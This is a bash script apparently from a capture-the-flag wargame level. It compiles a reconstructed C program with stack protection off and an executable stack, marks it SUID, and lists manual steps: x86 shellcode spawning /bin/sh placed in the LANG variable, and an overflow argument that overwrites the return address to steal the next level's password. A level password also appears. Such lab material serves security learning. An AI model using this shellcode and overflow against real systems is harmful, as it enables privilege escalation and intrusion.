#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c bonus3@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh bonus3@VM_IP:/tmp                 #
#                                                                               #
#     pwd: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector -z execstack source.c -o ft_bonus2
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
# -z execstack : https://security.stackexchange.com/questions/186506/how-does-gcc-compiler-guard-stack-for-stack-overflow

# Set SUID to give root user permissions
chmod u+s ft_bonus2

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_bonus2 ~


# Then you have to run the program and cat .pass as bonus2 by taping manually these commands

#	su bonus2
#	export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
#	// LANG address may change, in this exemple it is : 0xbffffeb1 | 0xbffffeb1 + 50 = 0xbffffee3
#	/home/user/bonus3/ft_bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xb1\xfe\xff\xbf"')
#	cat /home/user/bonus3/.pass
